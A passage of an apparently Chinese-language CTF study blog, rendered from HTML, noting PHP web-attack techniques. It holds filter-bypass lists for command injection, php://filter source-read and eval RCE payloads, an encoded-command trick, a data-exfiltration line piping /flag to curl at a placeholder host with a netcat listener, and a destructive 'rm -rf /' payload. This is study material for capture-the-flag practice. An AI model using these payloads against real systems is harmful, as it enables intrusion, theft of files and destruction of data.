</span></span><span class=line><span class=cl><span class=nx>system</span><span class=p>(</span><span class=s2>&#34;bash -c &#39;ls&#39;&#34;</span><span class=p>);</span> <span class=c1>// 命令执行
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=k>die</span><span class=p>(</span><span class=s1>&#39;FAIL&#39;</span><span class=p>);</span> <span class=c1>// 终止程序并输出
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>exit</span><span class=p>(</span><span class=nv>$hh</span><span class=p>);</span> <span class=c1>// 会输出$hh变量值
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>exit</span><span class=p>;</span> <span class=c1>// 终止脚本执行
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1>// 终端 php xx.php 执行
</span></span></span></code></pre></div></div><p><strong>http</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-PHP"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=c1>// a变量值
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;a&#39;</span><span class=p>];</span> <span class=c1>// post请求 若为数组某值构造 : a[xxx]=xxx
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;a&#39;</span><span class=p>];</span>  <span class=c1>// get请求
</span></span></span><span class=line><span class=cl><span class=c1>// 循环处理
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>foreach</span> <span class=p>(</span><span class=nv>$_POST</span> <span class=k>as</span> <span class=nv>$k</span><span class=o>=&gt;</span><span class=nv>$v</span><span class=p>);</span> <span class=c1>// $k键, $v值
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1>// 黑名单
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$BlackList</span> <span class=o>=</span> <span class=s2>&#34;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|</span><span class=se>\&#34;</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/</span><span class=si>{</span><span class=nv>$BlackList</span><span class=si>}</span><span class=s2>/is&#34;</span><span class=p>,</span><span class=nv>$post</span><span class=p>[</span><span class=s1>&#39;query&#39;</span><span class=p>])){};</span> <span class=c1>// s使.可匹配换行符\n防止换行绕过关键字过滤
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/flag/&#39;</span><span class=p>,</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;a&#39;</span><span class=p>])</span><span class=c1>// 检查是否存在匹配 flag 的子串
</span></span></span><span class=line><span class=cl><span class=c1>// /flag/i   i 忽略大小写匹配, 即FlaG也会匹配
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>@</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/^[a-zA-Z0-9]+\.$/&#34;</span><span class=p>,</span> <span class=nv>$b</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>// [a-zA-Z0-9]+   [x]: 表示匹配其中任何一个字符  +: 匹配前面一次或多次
</span></span></span><span class=line><span class=cl><span class=c1>// \.: 匹配 .  因为只有 . 是匹配任何字符, 此处转义 {6}:至少重复6次，可不连续
</span></span></span><span class=line><span class=cl><span class=c1>// @表示隐藏报错 ^$锚定开头和结尾
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>header</span><span class=p>(</span><span class=s1>&#39;Content-Type: &#39;</span> <span class=o>.</span> <span class=nv>$mime_type</span><span class=p>);</span> <span class=c1>// 设置指定 HTTP 响应头
</span></span></span></code></pre></div></div><p><strong>网络编程</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-PHP"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=nv>$ch</span> <span class=o>=</span> <span class=nx>curl_init</span><span class=p>();</span> <span class=c1>// 初始化 cURL 会话句柄
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1>// 设置 cURL 选项
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_URL</span><span class=p>,</span> <span class=nv>$url</span><span class=p>);</span>             <span class=c1>// 请求的url
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_HEADER</span><span class=p>,</span> <span class=k>false</span><span class=p>);</span>         <span class=c1>// 不获取响应头
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_RETURNTRANSFER</span><span class=p>,</span> <span class=k>true</span><span class=p>);</span>  <span class=c1>// 返回响应内容,不直接输出到控制台
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_FOLLOWLOCATION</span><span class=p>,</span> <span class=k>true</span><span class=p>);</span>  <span class=c1>// 自动跟随重定向 URL
</span></span></span><span class=line><span class=cl><span class=c1></span>    
</span></span><span class=line><span class=cl><span class=nv>$res</span> <span class=o>=</span> <span class=nx>curl_exec</span><span class=p>(</span><span class=nv>$ch</span><span class=p>);</span> <span class=c1>// 执行 cURL 请求
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>curl_close</span><span class=p>(</span><span class=nv>$ch</span><span class=p>);</span></span></span></code></pre></div></div><p><strong>图片处理</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-PHP"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=nv>$image_info</span> <span class=o>=</span> <span class=nx>getimagesizefromstring</span><span class=p>(</span><span class=nv>$res</span><span class=p>);</span> <span class=c1>// 解析二进制数据, 获取图片信息
</span></span></span><span class=line><span class=cl><span class=c1>// 返回7值数组: [宽度][高度][图像类型常数之一][height=&#34;yyy&#34; width=&#34;xxx&#34;][bits:每种颜色的位数][MIME 类型]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$mime_type</span> <span class=o>=</span> <span class=nv>$image_info</span><span class=p>[</span><span class=s1>&#39;mime&#39;</span><span class=p>];</span></span></span></code></pre></div></div><p><strong>文件读写</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-PHP"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=nv>$content</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;filename.txt&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>file_put_contents</span><span class=p>(</span><span class=s2>&#34;filename.txt&#34;</span><span class=p>,</span> <span class=s2>&#34;New content&#34;</span><span class=p>);</span></span></span></code></pre></div></div><h3 id=php伪协议>PHP伪协议</h3><p>URL格式：<code>scheme://user:password@address:port/path?query#fragment</code></p><p><strong>data://</strong></p><p>PHP>=5.2.0，可使用<code>data://</code>数据流封装器传递数据</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-PHP"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=nv>$a</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;a&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$pen</span><span class=p>)</span> <span class=o>!==</span> <span class=s1>&#39;hello&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>data</span><span class=o>://</span><span class=nx>text</span><span class=o>/</span><span class=nx>plain</span><span class=p>,</span><span class=nx>hello</span>        <span class=nx>读取出</span> <span class=s1>&#39;hello&#39;</span>
</span></span><span class=line><span class=cl><span class=nx>data</span><span class=o>://</span><span class=nx>text</span><span class=o>/</span><span class=nx>plain</span><span class=p>;</span><span class=nx>base64</span><span class=p>,</span><span class=nx>xx</span>    <span class=nx>xx</span> <span class=nx>Base64</span> <span class=nx>解码后读出内容</span></span></span></code></pre></div></div><p><strong>php://filter</strong> 读取源代码并进行base64编码输出</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-PHP"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=k>include</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>?</span><span class=nx>a</span><span class=o>=</span><span class=nx>php</span><span class=o>://</span><span class=nx>filter</span><span class=o>/</span><span class=nx>read</span><span class=o>=</span><span class=nx>convert</span><span class=o>.</span><span class=nx>base64</span><span class=o>-</span><span class=nx>encode</span><span class=o>/</span><span class=nx>resource</span><span class=o>=</span><span class=nx>flag</span><span class=o>.</span><span class=nx>php</span></span></span></code></pre></div></div><h3 id=命令执行>命令执行</h3><p>Linux下命令：</p><ul><li>ls替代：<code>dir</code></li><li>空格绕过：<code>&lt;</code>, <code>${IFS}</code>, <code>$IFS$9</code>, <code>%09</code>, <code>&lt;></code>, <code>&lt;</code>, <code>%20</code>, <code>$IFS</code></li><li>cat命令替代：<code>more</code>, <code>tail</code>, <code>head</code>, <code>less</code>, <code>nl</code>, <code>sort</code>, <code>tailf</code></li><li>截断字符替代：<code>&&</code>, <code>||</code>, <code>;</code>, <code>%0a</code>, <code>|</code></li><li>反斜杠绕过：<code>ca\t fl\ag.txt</code></li><li>编码绕过：<code>echo 'a==' | base64 -d</code></li><li>单双引号绕过：<code>c'a't</code>, <code>c"a"t</code></li><li>通配符绕过：<code>f?ag</code>, <code>f*</code>, <code>f[a-z]ag</code>, <code>f{l,b}ag</code></li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-php"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>shell_exec</span><span class=p>(</span><span class=s2>&#34;nslookup &#34;</span> <span class=o>.</span> <span class=nv>$domain</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>// &amp;quot;为&#34;的html形式
</span></span></span></code></pre></div></div><p>若匹配flag，查看目录下文件内容</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cat <span class=sb>`</span>ls<span class=sb>`</span> </span></span></code></pre></div></div><p><strong>环境变量注入实现命令执行</strong></p><ul><li><code>BASH_ENV</code>：可以在<code>bash -c</code>的时候注入任意命令</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>BASH_ENV</span><span class=o>=</span><span class=s1>&#39;$(id 1&gt;&amp;2)&#39;</span> bash -c <span class=s1>&#39;echo hello&#39;</span> <span class=c1># 将输入id以及hello</span></span></span></code></pre></div></div><p>注入时对命令中字母进行编码绕过可在Linux下执行</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># cat flag 字母转换: oct(ord(&#39;c&#39;))[2:]</span>
</span></span><span class=line><span class=cl><span class=c1># 每个字节前加上$</span>
</span></span><span class=line><span class=cl><span class=s1>$&#39;\143&#39;$&#39;\141&#39;$&#39;\164&#39;</span> <span class=s1>$&#39;\146&#39;$&#39;\154&#39;$&#39;\141&#39;$&#39;\147&#39;</span></span></span></code></pre></div></div><p><strong>反弹shell命令</strong></p><ul><li>使用花生壳，内网为kali地址及端口，外部为某域名</li><li>kali中<code>nc -lnvp 5555</code>即可</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cat /flag <span class=p>|</span> curl -d @- https://xx.xx.xx.xx:port <span class=c1># @-表示从标准输入读取, -d指定发送数据</span></span></span></code></pre></div></div><h3 id=远程命令执行>远程命令执行</h3><p>RCE，Remote Command Execution</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-PHP"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=k>eval</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;what&#39;</span><span class=p>]);</span></span></span></code></pre></div></div><p><strong>利用</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-PHP"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=nx>what</span><span class=o>=&lt;?</span><span class=nx>php</span> <span class=nx>system</span><span class=p>(</span><span class=s1>&#39;rm -rf /&#39;</span><span class=p>);</span> <span class=cp>?&gt;</span><span class=err> // 删除系统所有文件
</span></span></span><span class=line><span class=cl><span class=err>what=echo getcwd(); // 查看当前目录
</span></span></span><span class=line><span class=cl><span class=err>what=print_r(scandir(getcwd())); // 查看当前目录所有文件和目录
</span></span></span><span class=line><span class=cl><span class=err>what=print_r(scandir(&#39;../&#39;));    // 查看上一目录所有文件和目录
</span></span></span><span class=line><span class=cl><span class=err>what=echo file_get_contents(&#39;filename.txt&#39;); // 查看文件内容
</span></span></span></code></pre></div></div><p><strong>无参函数RCE</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-PHP"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\/|zip:\/\//i&#39;</span><span class=p>,</span> <span class=nv>$cmd</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=c1>// 禁用协议
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span><span class=p>(</span><span class=s1>&#39;;&#39;</span> <span class=o>===</span> <span class=nx>preg_replace</span><span class=p>(</span><span class=s1>&#39;/[a-z,_]+\((?R)?\)/&#39;</span><span class=p>,</span> <span class=k>NULL</span><span class=p>,</span> <span class=nv>$cmd</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=c1>// 只能为无参函数嵌套形式: func(fun(h()));
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/pwd|tac|cat|chr|ord|ls|dir|conv|info|hex|bin|rand|array|source|file|cwd|dfined|system|assert|sess/i&#39;</span><span class=p>,</span><span class=nv>$cmd</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=c1>// 黑名单过滤cmd
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=k>eval</span><span class=p>(</span><span class=nv>$cmd</span><span class=p>);</span></span></span></code></pre></div></div><p><code>getallheaders()</code>绕过&mdash;-返回当前请求的所有请求头信息（限Apache）</p><p><code>var_dump(end(getallheaders()));</code>测试是否可以获取到返回信息</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-PHP"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=o>?</span><span class=nx>cmd</span><span class=o>=</span><span class=k>eval</span><span class=p>(</span><span class=nx>end</span><span class=p>(</span><span class=nx>getallheaders</span><span class=p>()));</span> <span class=c1>// url
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1>// 及在burp数据包下最后一行加入以下任何一个进行命令执行
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>sky</span><span class=o>:</span> <span class=nx>phpinfo</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nx>sky</span><span class=o>:</span> <span class=nx>system</span><span class=p>(</span><span class=s2>&#34;ls&#34;</span><span class=p>);</span></span></span></code></pre></div></div><h3 id=常见绕过>常见绕过</h3><p><strong>MD5绕过</strong></p><ul><li>MD5 碰撞：两个不同的字符串 MD5 哈希值相等</li></ul><p><strong>php弱类型比较: 构造md5值为0e开头的科学计数法</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-PHP"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nv>$name</span> <span class=o>!=</span> <span class=nv>$password</span> <span class=o>&amp;&amp;</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$name</span><span class=p>)</span> <span class=o>==</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$password</span><span class=p>))</span></span></span></code></pre></div></div><p>payload：</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Plain"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Plain data-lang=Plain><span class=line><span class=cl>QNKCDZO
</span></span><span class=line><span class=cl>240610708
</span></span><span class=line><span class=cl>s878926199a
</span></span><span class=line><span class=cl>s155964671a
</span></span><span class=line><span class=cl>s214587387a</span></span></code></pre></div></div><p><strong>php强类型比较: 构造数组</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-PHP"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nv>$name</span> <span class=o>!==</span> <span class=nv>$password</span> <span class=o>&amp;&amp;</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$name</span><span class=p>)</span> <span class=o>===</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$password</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=c1>// 0e字符串无法绕过 而 md5 函数传入数组的返回值都是NULL
</span></span></span></code></pre></div></div><p>payload：</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Plain"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Plain data-lang=Plain><span class=line><span class=cl>url: password[]=2&amp;name[]=1</span></span></code></pre></div></div><p><strong>MD5哈希爆破</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>hashlib</span> <span class=kn>import</span> <span class=n>md5</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>10000000</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>md5</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span> <span class=o>==</span> <span class=s1>&#39;xxxx&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>)</span></span></span></code></pre></div></div><p><strong>字符绕过</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-PHP"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>is_numeric</span><span class=p>(</span><span class=nv>$a</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=nx>is_numeric</span><span class=p>(</span><span class=nv>$b</span><span class=p>))</span> <span class=p>{</span> <span class=c1>// a和b不是数值
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=nv>$a</span> <span class=o>==</span> <span class=mi>0</span> <span class=o>&amp;&amp;</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$a</span><span class=p>)</span> <span class=o>==</span> <span class=nv>$b</span><span class=p>[</span><span class=nv>$a</span><span class=p>]){}</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=c1>// 可以通过 a = false = 0
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$a</span> <span class=o>&gt;</span> <span class=mi>99</span><span class=p>)</span> <span class=c1>// a = 100abc也可通过且可绕过in_numeric
</span></span></span></code></pre></div></div><p><strong>哈希函数绕过</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-php"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>hash_hmac</span><span class=p>(</span><span class=s1>&#39;sha256&#39;</span><span class=p>,</span> <span class=nv>$a</span><span class=p>,</span> <span class=nv>$b</span><span class=p>);</span> <span class=c1>// $a为数组时，加密结果固定为NULL
</span></span></span></code></pre></div></div><h3 id=反序列化漏洞-1>反序列化漏洞</h3><p><strong>序列化</strong></p><ul><li>序列化：对象转换为字节序列，为保存对象方便重用</li><li>反序列化：字节序列恢复为对象</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-PHP"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=nv>$c</span> <span class=o>=</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$arr</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span> <span class=o>=</span> <span class=nx>unserialize</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;data&#39;</span><span class=p>]);</span> <span class=c1>// 已序列化的字符串还原为PHP的原始数据类型或对象
</span></span></span></code></pre></div></div><p><strong>序列化格式</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-PHP"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
